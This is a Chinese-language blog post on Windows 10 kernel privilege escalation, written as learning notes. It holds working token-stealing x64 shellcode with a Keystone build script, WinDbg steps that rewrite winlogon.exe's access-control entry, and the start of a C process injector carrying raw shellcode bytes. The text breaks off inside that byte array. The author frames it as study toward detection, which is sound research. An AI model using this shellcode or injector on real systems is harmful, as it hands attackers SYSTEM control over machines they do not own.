---
title: windows10内核态提权方法汇总
url: 780.html
id: 780
categories:
  - windows驱动
date: 2021-08-22 17:25:59
tags:
	- binary
	- kernal
	- asm
---


## 前言

近期由于某些项目的原因，突然激发了我对windows内核提权原理的兴趣。于是就想研究一下，在拿到一个内核态任意代码执行漏洞后，到底有多少种方法常用的方法还能在windows 10上成功提权，针对这些不同的提权方法到底有没有一个比较通用的拦截方案？ 所以就有了如下这篇学习记录。

不同于ring3层的shellcode那样功能多样化，在的漏洞利用过程中，ring0层的shellcode通常用来获取 `nt authority\system`权限，本文基于的前提是已经有一个内核态任意代码执行漏洞的前提下，学习三种还能够在windows 10 上成功提权的方法，并写出相对应的shellcode。 

<!-- more -->
## 环境的准备

为了进行内核态的shellcode测试，那首先就需要先有一个内核态的任意代码执行漏洞。最简单的思路就是写一个驱动，它能够从用户态读取shellcode过来，然后在内核中当作代码执行。非常幸运的这样的代码fireeye已经帮我们实现了[https://github.com/fireeye/flare-kscldr](https://github.com/fireeye/flare-kscldr),只需要下载编译就可以使用。

不过在使用之前我们还是简单的看一下`flare-kscldr` 的代码逻辑，帮助我们理解。

驱动中主要实现了如下两个irp请求：

```c++
    DriverObject->MajorFunction[IRP_MJ_WRITE] = scldrWrite;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = scldrDeviceControl;
```

`IRP_MJ_WRITE`主要响应写请求，实现从用户态将shellcode写入驱动的设备扩展。

```c++
NTSTATUS
scldrWrite(
    __inout PDEVICE_OBJECT DeviceObject,
    __inout PIRP Irp
)
{
    NTSTATUS nts = STATUS_UNSUCCESSFUL;
    ULONG len = 0;
    PVOID src = NULL;
    PIO_STACK_LOCATION io_stack = NULL;
    struct ScldrDevExt *dev_ext = NULL;
    BOOLEAN took_mutex = FALSE;

    ASSERT(KeGetCurrentIrql() <= APC_LEVEL);

    io_stack = IoGetCurrentIrpStackLocation(Irp);

    len = io_stack->Parameters.Write.Length;

    PDEBUG("scldrWrite(%d)\n", len);

    // Assume failure
    Irp->IoStatus.Information = 0;

    dev_ext = (struct ScldrDevExt *)DeviceObject->DeviceExtension;
    if (NULL == dev_ext)
    {
        len = 0;
        nts = STATUS_INVALID_DEVICE_STATE;
        goto exit_scldrWrite;
    }

    ExAcquireFastMutex(&dev_ext->mutex);
    took_mutex = TRUE;

    if (len > dev_ext->max_len)
    {
        nts = STATUS_BUFFER_OVERFLOW;
        len = 0;
    }
    else
    {
        if (!len)
        {
            if (dev_ext->buf)
            {
                ExFreePoolWithTag(dev_ext->buf, TAG);
                dev_ext->buf = NULL;
                dev_ext->len = 0;
            }
        }
        else
        {
            src = Irp->AssociatedIrp.SystemBuffer;
            nts = scldrDevExtSetBufUnsafe(dev_ext, (PUCHAR)src, len);
        }
    }

exit_scldrWrite:
    if (took_mutex)
    {
        ExReleaseFastMutex(&dev_ext->mutex);
    }

    Irp->IoStatus.Information = len;
    Irp->IoStatus.Status = nts;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return nts;
}
```

`IRP_MJ_DEVICE_CONTROL`irp主要响应如下几个控制代码：

```c++
#define IOCTL_kscldr_setmaxlength \
    CTL_CODE( \
            FILE_DEVICE_UNKNOWN, \
            KSCLDR_FUNCTION_SET_MAX_LENGTH, \
            METHOD_BUFFERED, \
            FILE_WRITE_DATA \
       )

// 是否在执行shellcode之前设置断点，方便调试
#define IOCTL_kscldr_setbreakpointdisposition \
    CTL_CODE( \
            FILE_DEVICE_UNKNOWN, \
            KSCLDR_FUNCTION_SET_BREAKPOINT_DISPOSITION, \
            METHOD_BUFFERED, \
            FILE_WRITE_DATA \
       )
// 调用shellcode
#define IOCTL_kscldr_callsc \
    CTL_CODE( \
            FILE_DEVICE_UNKNOWN, \
            KSCLDR_FUNCTION_CALL, \
            METHOD_BUFFERED, \
            FILE_EXECUTE \
       )

```

至于其他的双机调试环境和此工具的使用方法就不再细说了，可以查看其他的windows内核调试教程。

## 方法一：Token窃取

token窃取是windows内核提权最常用的办法，其核心的原理是用`system`进程中的token替换当前漏洞利用进程的token，实现身份伪造。运行中的Windows进程所关联的用户帐户和访问权限由一个叫做令牌（token）的内核对象仲裁。用于跟踪各种特定进程数据的内核数据结构包含了一个指向token的指针。当进程试图去执行各种操作时，比如打开一个文件，token中的账户权限会用于和所需的权限进行比较，以此决定该操作是否可行。

因为token指针只是内核内存中的数据，对于在内核模式中执行的代码来说，将其更改为指向不同的token以赋予该进程一个不同的权限集，这是非常容易的事情。接下来我们就先用windbg进行效果演示，将普通用户权限的`cmd.exe` 进程修改为`system` 权限。

### 使用windbg修改提权

首先先获取`system`进程的`EPROCESS`地址：

```c
0: kd> !process 0 0 system 
PROCESS ffffa98848069080
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad002  ObjectTable: ffffcc077de05d40  HandleCount: 2486.
    Image: System
```

下面查看`EPROCESS`的数据：

```c
0: kd> dt _EPROCESS  ffffa98848069080  
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   ..... 
   +0x358 ExceptionPortState : 0y000
   +0x360 Token            : _EX_FAST_REF
   +0x368 MmReserved       : 0
```

可以看到`Token`是一个`_EX_FAST_REF`结构，这是windows，它依赖于一种假定，在16字节的边界上需要将内核数据结构对齐到内存中。这意味着一个指向token或其他任何内核对象的指针最低的4个位永远都是0（十六进制就是最后一个数永远为0）。Windows因此可以自由的使用该指针的低4位用于其他目的（在本例中为可用于内部优化的引用计数)。

```c++
0: kd> dt _EX_FAST_REF
ntdll!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B
```

只需要将`_EX_FAST_REF`的数据低4bit置零，就可以获取到token的数据结构了。

```c++
// eprocess 偏移为 0x360 的位置存储的是token ，这个偏移与其他版本的windows有区别
0: kd> dq ffffa98848069080 + 0x360  L1  
ffffa988`480693e0  ffffcc07`7de0772d
// 将最后 4bit 置 0 
```

```c
0: kd> !token ffffcc07`7de07720 
_TOKEN 0xffffcc077de07720
TS Session ID: 0
User: S-1-5-18
User Groups: 
 00 S-1-5-32-544
    Attributes - Default Enabled Owner 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-11
    Attributes - Mandatory Default Enabled 
 03 S-1-16-16384
    Attributes - GroupIntegrity GroupIntegrityEnabled 
Primary Group: S-1-5-18
Privs: 
 02 0x000000002 SeCreateTokenPrivilege            Attributes - 
 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - 
 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default 
 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - 
 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default 
 08 0x000000008 SeSecurityPrivilege               Attributes - 
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - 
 10 0x00000000a SeLoadDriverPrivilege             Attributes - 
 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default 
 12 0x00000000c SeSystemtimePrivilege             Attributes - 
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default 
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default 
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default 
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default 
 17 0x000000011 SeBackupPrivilege                 Attributes - 
 18 0x000000012 SeRestorePrivilege                Attributes - 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default 
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default 
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 28 0x00000001c SeManageVolumePrivilege           Attributes - 
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default 
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - 
 32 0x000000020 SeRelabelPrivilege                Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default 
 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default 
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default 
 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default 
Authentication ID:         (0,3e7)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: *SYSTEM*           TokenFlags: 0x2000 ( Token NOT in use ) 
Token ID: 3eb              ParentToken ID: 0
Modified ID:               (0, 3ec)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 0
PackageSid: (null)
CapabilityCount: 0      Capabilities: 0x0000000000000000
LowboxNumberEntry: 0x0000000000000000
Security Attributes:
Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims
Process Token TrustLevelSid: S-1-19-1024-8192
```

可以看到system的权限跟这个数据一致。

![](https://pic.wonderkun.cc//uploads/note/20210821195011.png)

下一步就是定位`cmd.exe`进程的`_EPROCESS`结构并替换偏移0x360的token指针值为System的token地址。

```c++
1: kd> !process 0 0 cmd.exe 
PROCESS ffffa988480e30c0
    SessionId: 1  Cid: 07bc    Peb: a26a142000  ParentCid: 1340
    DirBase: 9a1f6002  ObjectTable: ffffcc0783789d80  HandleCount:  70.
    Image: cmd.exe

1: kd> eq ffffa988480e30c0 + 0x360   ffffcc07`7de07720
```

然后看一下cmd.exe的权限，发现已经提权成功了。

![](https://pic.wonderkun.cc//uploads/note/20210821195838.png)

### 写shellcode

按照上面的思路，首先需要获取到进程的`EPROCESS`结构体的地址，在内核中可以获取到`EPROCESS`结构的函数是`PsGetCurrentProcess`

![](https://pic.wonderkun.cc//uploads/note/20210821200447.png)

我们反汇编这个函数的代码：

```c
1: kd> uf PsGetCurrentProcess 
nt!PsGetCurrentProcess:
fffff802`41abe0e0 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff802`41abe0e9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]
fffff802`41abe0f0 c3              ret
```

其实`gs:[188h]`的位置存贮的是`_KTHREAD`结构的地址，看一下这个结构，发现0x220的位置存储的就是`_KPROCESS`：

```c
1: kd> dt _KTHREAD   
ntdll!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   ......
   +0x220 Process          : Ptr64 _KPROCESS
   +0x228 UserAffinity     : _GROUP_AFFINITY
```

但是函数`PsGetCurrentProcess`取的数据是 `0xb8`偏移的数据，其实这两个位置指向的是同一个数据。`_KTHREAD` 0x98偏移位置是`ApcStateFill`，其实存储的结构是`_KAPC_STATE`，`0x20`位置存储的就是`_KPROCESS`。

```
1: kd> dt _KTHREAD   
ntdll!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   ......
+0x098 ApcStateFill     : [43] UChar
```

```c
1: kd> dt _KAPC_STATE  
ntdll!_KAPC_STATE
   +0x000 ApcListHead      : [2] _LIST_ENTRY
   +0x020 Process          : Ptr64 _KPROCESS 
   +0x028 InProgressFlags  : UChar
   +0x028 KernelApcInProgress : Pos 0, 1 Bit
   +0x028 SpecialApcInProgress : Pos 1, 1 Bit
   +0x029 KernelApcPending : UChar
   +0x02a UserApcPendingAll : UChar
   +0x02a SpecialUserApcPending : Pos 0, 1 Bit
   +0x02a UserApcPending   : Pos 1, 1 Bit
```

所以如下两段汇编代码都可以获取到当前进程的的`_KPROCESS`：

```assembly
mov r9, qword ptr gs:[0x188]
mov r9, qword ptr[r9+0x220]
```

或者

```assembly
mov r9, qword ptr gs:[0x188]
mov r9, qword ptr[r9+0x0B8]
```

我们想修改的是cmd.exe的权限，但是这样获得的仅仅是cmd.exe启动的提权的进程的`_KPROCESS`，接下里需要去找其父进程cmd.exe的`_KPROCESS`位置。接下里看一下`_EPROCESS`的结构：

```c
1: kd> dt _EPROCESS  
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : Ptr64 Void
   +0x308 RefTraceEnabled  : Pos 9, 1 Bit
   ....
   +0x3e8 InheritedFromUniqueProcessId : Ptr64 Void
```

`UniqueProcessId` 存储的是当前进程的pid，`InheritedFromUniqueProcessId`存储的是父进程的pid。

在这里其实有一个疑问，我们获取的其实是`_KPROCESS`的地址，但需要的是`_EPROCESS`的地址，这怎么处理呢？

其实`_KPROCESS` 和`_EPROCESS` 指向的是同一个结构，这个从`_EPROCESS`的定义中就可以看出来，`_EPROCESS`是包含了`_KPROCESS`的结构体，他们的起始地址是一样的。

现在我们可以获取到cmd.exe的进程id，接下里需要获取到cmd.exe进程的 `_EPROCESS`,这里需要另外一个知识，windows系统中的所有进程`_KPROCESS`是使用一个双向链表进行管理的，链表元素就是`ActiveProcessLinks`，接下来遍历这个链表就可以找到cmd.exe的`_KPROCESS`。

```assembly
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : Ptr64 Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY

1: kd> dt _LIST_ENTRY
ntdll!_LIST_ENTRY
   +0x000 Flink            : Ptr64 _LIST_ENTRY
   +0x008 Blink            : Ptr64 _LIST_ENTRY
```

代码如下：

```assembly
mov r9, qword ptr gs:[0x188]  ; stores KTHREAD value
mov r9, qword ptr[r9+0x220]  ; stores EPROCESS as an offset to KTHREAD
mov r8, [r9+0x3e8]                ;stores InheritedFromUniqueProcessId (cmd.exe PID)
mov rax, r9                       ;moves current EPROCESS into eax
loop1:
  mov rax,qword ptr [rax + 0x2f0]          ;saves the next linked list pointer into rax
  sub rax, 0x2f0                  ;gets the KPROCESS
  cmp [rax + 0x2e8],r8            ;compare the ProcessId with cmd's.
  jne loop1                       ;if not equal, repeat
```

cmd.exe 的 `_KPROCESS` 地址就存储在`rax` 中。

接下来再遍历一遍`_KPROCESS`，读取`system`进程的token，替换掉cmd.exe进程的。`system`进程在系统中的pid恒定为4，根据这个来找：

```assembly
mov rdx,rax
add rdx,0x360  ; 存储cmd.exe的token的地址
mov rax,r9
loop2:  ; 找system进程的 KTHREAD
	mov rax,qword ptr [rax + 0x2f0]          ;saves the next linked list pointer into rax
	sub rax, 0x2f0                  ;gets the KPROCESS
	cmp  byte ptr [rax + 0x2e8],4            ;compare the ProcessId with cmd's.
    jne loop2
mov rcx,rax 
add rcx,0x360 ; 获取system的token地址
mov rbx, [rcx] ; 读取token的内容
mov [rdx],rbx ; 写进cmd.exe
ret
```

接下来使用`Keystone`进行编译，测试:

```python
#coding:utf-8 

import keystone as k

CODE = """
mov r9, qword ptr[r9+0x220]  
mov r8, [r9+0x3e8]               
mov rax, r9                     
loop1:
  mov rax,qword ptr [rax + 0x2f0]         
  sub rax, 0x2f0                 
  cmp [rax + 0x2e8],r8           
  jne loop1                      
mov rdx,rax
add rdx,0x360 
mov rax,r9
loop2:  
	mov rax,qword ptr [rax + 0x2f0]       
	sub rax, 0x2f0                
	cmp  byte ptr [rax + 0x2e8],4  
    jne loop2
mov rcx,rax 
add rcx,0x360 
mov rbx, [rcx]  
mov [rdx],rbx 
ret
"""


'''
mov r9,qword ptr gs:[0x188] capstone支持的不好，汇编出来的是不对的
不要问我为什么，我也想知道为什么 .....
有时间了去看看keystone的源代码了，看能不能修
'''

# CODE = """mov r9,qword ptr gs:[0x188]"""

try:

    ks = k.Ks(k.KS_ARCH_X86, k.KS_MODE_64)
    encoding, count = ks.asm(CODE)
    '''
       补充 mov r9,qword ptr gs:[0x188] 的的操作码
    '''
    read_gs = [ 0x65 ,0x4C, 0x8B ,0x0C,0x25, 0x88 ,0x01 ,0x00 ,0x00 ]
    encoding = read_gs + encoding
    print(encoding)
    # print("%s = %s (number of statements: %u)" %(CODE, encoding, count))
    with open("shellcode.bin","wb") as fd:
        fd.write( bytes( encoding ) )
except k.KsError  as e:
    print("ERROR: %s" %e)
```

记得关闭系统的UAC和windows defender，最后测试结果如下，提权成功 ：

![](https://pic.wonderkun.cc//uploads/note/20210822195418.png)

windows defender的内存扫描可以把这个shellcode判黑，还是挺厉害的。

## 方法二：编辑ACL/ACE

此方法在2012年就提出了，主要思想是编辑一个高权限的系统进程的`SecurityDescriptor`，将它修改为NULL，这样会导致一个低权限的用户能够修改和编辑高权限的进程，然后进行进程注入，弹出具有system权限的shell。但是直接将 `SecurityDescriptor` 置0的操作已经被windows patch了。虽然直接修改为NULL会造成蓝屏，但是这并不意味着我们不能修改`SecurityDescriptor`, 我们可以修改的ACL列表，让任意用户可以访问此进程。不过这意味着之前一个内核中的一个任意地址置零就可以利用的漏洞，现在必须通过任意地址写才可以利用了。

我们先将`SecurityDescriptor` 修改为0，看一下会发生什么：

首先windows的内核对象前都有一个 `_object_header`的结构，它的大小是0x30:

```assembly
1: kd> dt _object_header
nt!_OBJECT_HEADER
   +0x000 PointerCount     : Int8B
   +0x008 HandleCount      : Int8B
   +0x008 NextToFree       : Ptr64 Void
   +0x010 Lock             : _EX_PUSH_LOCK
   +0x018 TypeIndex        : UChar
   +0x019 TraceFlags       : UChar
   +0x019 DbgRefTrace      : Pos 0, 1 Bit
   +0x019 DbgTracePermanent : Pos 1, 1 Bit
   +0x01a InfoMask         : UChar
   +0x01b Flags            : UChar
   +0x01b NewObject        : Pos 0, 1 Bit
   +0x01b KernelObject     : Pos 1, 1 Bit
   +0x01b KernelOnlyAccess : Pos 2, 1 Bit
   +0x01b ExclusiveObject  : Pos 3, 1 Bit
   +0x01b PermanentObject  : Pos 4, 1 Bit
   +0x01b DefaultSecurityQuota : Pos 5, 1 Bit
   +0x01b SingleHandleEntry : Pos 6, 1 Bit
   +0x01b DeletedInline    : Pos 7, 1 Bit
   +0x01c Reserved         : Uint4B
   +0x020 ObjectCreateInfo : Ptr64 _OBJECT_CREATE_INFORMATION
   +0x020 QuotaBlockCharged : Ptr64 Void
   +0x028 SecurityDescriptor : Ptr64 Void
   +0x030 Body             : _QUAD
```

所以 `_EPROCESS`向前0x30的位置，就是进程对象的`_object_header`:

```assembly

1: kd> !process 0 0 winlogon.exe 
PROCESS ffffb78f2b0d3140
    SessionId: 1  Cid: 0260    Peb: 6336452000  ParentCid: 01f8
    DirBase: 12b8fd002  ObjectTable: ffff900849cfc180  HandleCount: 257.
    Image: winlogon.exe
    
1: kd> dt _object_header ffffb78f2b0d3140-30 
nt!_OBJECT_HEADER
   +0x000 PointerCount     : 0n458557
   ....
   +0x028 SecurityDescriptor : 0xffff9008`464082a1 Void
   +0x030 Body             : _QUAD
```

将`SecurityDescriptor` 修改为NULL，就会直接蓝屏了

```assembly
1: kd> eq  ffffb78f2b0d3140-30+28 0  
1: kd> g
KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x00000189
                       (0xFFFFB78F2B0D3110,0xFFFFB78F272AF380,0x0000000000000001,0x0000000000000000)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

For analysis of this file, run !analyze -v
nt!DbgBreakPointWithStatus:
fffff800`3afc4580 cc              int     3
```

这就直接蓝屏了。

### 使用windbg进行调试

我们接下里开始正确的思路，进行的步骤是：

```
1. 定位到winlogon.exe进程的SecurityDescriptor
2. 从SecurityDescriptor中找到包含ACCESS_ALLOWED_ACE的DACL列表
3. 修改其中的sid为 S-1-5-11, 所有经过身份认证的用户都是这个sid，这样就是当前的所有用户都有权限访问和修改此进程
4. 修改漏洞利用进程的MandatoryPolicy为0，进行进程注入，获取system权限。
```

为了修改ACL，我们先看一下相关的数据结构：

```assembly
0: kd> dt _SECURITY_DESCRIPTOR 
nt!_SECURITY_DESCRIPTOR
   +0x000 Revision         : UChar
   +0x001 Sbz1             : UChar
   +0x002 Control          : Uint2B
   +0x008 Owner            : Ptr64 Void
   +0x010 Group            : Ptr64 Void
   +0x018 Sacl             : Ptr64 _ACL
   +0x020 Dacl             : Ptr64 _ACL
```

这里可以看到`Dacl`,它保存了对此对象有操作权限的用户，ACL的结构如下：

```assembly
0: kd> dt _ACL 
nt!_ACL
   +0x000 AclRevision      : UChar
   +0x001 Sbz1             : UChar
   +0x002 AclSize          : Uint2B
   +0x004 AceCount         : Uint2B
   +0x006 Sbz2             : Uint2B
```

可以说明这个`_ACL`其实只存储了数据头部，后买你才是真实存储的ACL数据。在DACL中有两种ACE，分别是`ACCESS_ALLOWED_ACE`和`ACCESS_DENIED_ACE`,我们接下来就开始修改`ACCESS_ALLOWED_ACE`,实现让任意用户都有访权限。

```c
typedef struct _ACCESS_ALLOWED_ACE {
  ACE_HEADER  Header;
  ACCESS_MASK Mask;
  DWORD       SidStart;
} ACCESS_ALLOWED_ACE;
```

接下来就来看一下这个具体的`SecurityDescriptor` 是长什么样：

```assembly
0: kd> !process 0 0 winlogon.exe
PROCESS ffffb78f2b0d3140
    SessionId: 1  Cid: 0260    Peb: 6336452000  ParentCid: 01f8
    DirBase: 12b8fd002  ObjectTable: ffff900849cfc180  HandleCount: 259.
    Image: winlogon.exe

0: kd> dt _OBJECT_HEADER ffffb78f2b0d3140-30  SecurityDescriptor
nt!_OBJECT_HEADER
   +0x028 SecurityDescriptor : 0xffff9008`464082a2 Void
0: kd> !sd 0xffff9008`464082a2
30000000140000: Unable to get MIN SID header
30000000140000: Unable to read in Owner in SD
0: kd> !sd 0xffff9008`464082a0 
->Revision: 0x1
->Sbz1    : 0x0
->Control : 0x8814
            SE_DACL_PRESENT
            SE_SACL_PRESENT
            SE_SACL_AUTO_INHERITED
            SE_SELF_RELATIVE
->Owner   : S-1-5-32-544
->Group   : S-1-5-18
->Dacl    : 
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x3c
->Dacl    : ->AceCount   : 0x2
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
->Dacl    : ->Ace[0]: ->SID: S-1-5-18

->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[1]: ->AceFlags: 0x0
->Dacl    : ->Ace[1]: ->AceSize: 0x18
->Dacl    : ->Ace[1]: ->Mask : 0x00121411
->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544

->Sacl    : 
->Sacl    : ->AclRevision: 0x2
->Sacl    : ->Sbz1       : 0x0
->Sacl    : ->AclSize    : 0x1c
->Sacl    : ->AceCount   : 0x1
->Sacl    : ->Sbz2       : 0x0
->Sacl    : ->Ace[0]: ->AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE
->Sacl    : ->Ace[0]: ->AceFlags: 0x0
->Sacl    : ->Ace[0]: ->AceSize: 0x14
->Sacl    : ->Ace[0]: ->Mask : 0x00000003
->Sacl    : ->Ace[0]: ->SID: S-1-16-16384
```

DACL有两项ACE，`S-1-5-18` 是 `LocalSystem` 用户，`S-1-5-32-544` 是administrator用户，但是这里需要注意的是 windbg给出的`_SECURITY_DESCRIPTOR`符号是错误，有大佬已经给我们指出了正确的偏移如下：

```assembly
kd> dt _SECURITY_DESCRIPTOR
nt!_SECURITY_DESCRIPTOR
   +0x000 Revision         : UChar
   +0x001 Sbz1             : UChar
   +0x002 Control          : Uint2B
   +0x008 Owner            : Ptr64 Void
   +0x010 Group            : Ptr64 Void
   +0x018 Sacl             : Ptr64 _ACL
   +0x020 Dacl             : Ptr64 _ACL   <<<<<<<< wrong symbol, it should be 0x30
```

下面来查看一下DACL：

```assembly
0: kd> dt _ACL 0xffff9008`464082a0 + 0x30 
nt!_ACL
   +0x000 AclRevision      : 0x2 ''
   +0x001 Sbz1             : 0 ''
   +0x002 AclSize          : 0x3c
   +0x004 AceCount         : 2
   +0x006 Sbz2             : 0
```

和我们刚才使用`!sd`命令打印出来的ACL头信息是一致的，但是这里只能看见头，观察一下这个数据：

```assembly
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x3c
->Dacl    : ->AceCount   : 0x2
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
->Dacl    : ->Ace[0]: ->SID: S-1-5-18

->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[1]: ->AceFlags: 0x0
->Dacl    : ->Ace[1]: ->AceSize: 0x18
->Dacl    : ->Ace[1]: ->Mask : 0x00121411
->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544
```

`AclRevision,Sbz1,AclSize,AceCount,Sbz2`其实就是`_ACL`，占8个字节，接下来的每一个ACE都是以`AceType,AceFlags，AceSize`开始的，其实是`_ACE_HEADER `结构：

```c
typedef struct _ACE_HEADER {
  BYTE AceType;
  BYTE AceFlags;
  WORD AceSize;
} ACE_HEADER;
```

占4个字节，最后是`Mask`占4个字节，所以偏移0x10的位置就有一个sid。

我们dump一下数据：

```assembly
0: kd> dd 0xffff9008`464082a0 + 0x30 
ffff9008`464082d0  003c0002 00000002 00140000 001fffff
ffff9008`464082e0  00000101 05000000 00000012 00180000
ffff9008`464082f0  00121411 00000201 05000000 00000020
```

`00000101 05000000 00000012` 就表示的sid:

```assembly
0: kd> dt _sid
nt!_SID
   +0x000 Revision         : UChar
   +0x001 SubAuthorityCount : UChar
   +0x002 IdentifierAuthority : _SID_IDENTIFIER_AUTHORITY
   +0x008 SubAuthority     : [1] Uint4B
0: kd> dt _sid  0xffff9008`464082a0 + 0x40
nt!_SID
   +0x000 Revision         : 0x1 ''
   +0x001 SubAuthorityCount : 0x1 ''
   +0x002 IdentifierAuthority : _SID_IDENTIFIER_AUTHORITY
   +0x008 SubAuthority     : [1] 0x12
```

对应的值刚好就是`1-5-18`，将其修改为`1-5-11`：

```assembly
0: kd> db 0xffff9008`464082a0 + 0x48 L1 
ffff9008`464082e8  12                                               .
0: kd> eb 0xffff9008`464082a0 + 0x48 b  
```

接下里使用查看一下此进程的权限：

```assembly
0: kd> !sd 0xffff9008`464082a0 
->Revision: 0x1
->Sbz1    : 0x0
->Control : 0x8814
            SE_DACL_PRESENT
            SE_SACL_PRESENT
            SE_SACL_AUTO_INHERITED
            SE_SELF_RELATIVE
->Owner   : S-1-5-32-544
->Group   : S-1-5-18
->Dacl    : 
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x3c
->Dacl    : ->AceCount   : 0x2
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
->Dacl    : ->Ace[0]: ->SID: S-1-5-11
```

修改成功了，当前的winlogon.exe已经可以被任意进程访问了。

### 注入验证

接下来就要尝试注入`winlogon.exe`,弹出system权限的shell。写如下代码：

```c
// ConsoleApplication3.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>

DWORD getProcessId(WCHAR* str)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD PID;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return 0;
	}

	do
	{
		if (!wcscmp(pe32.szExeFile, str))
		{
			PID = pe32.th32ProcessID;
			return PID;
		}
	} while (Process32Next(hProcessSnap, &pe32));
	return 0;
}

BOOL injectCode()
{
	void* pMem;
	WCHAR str[] = L"winlogon.exe";
	HANDLE hEx = NULL;
	CHAR shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
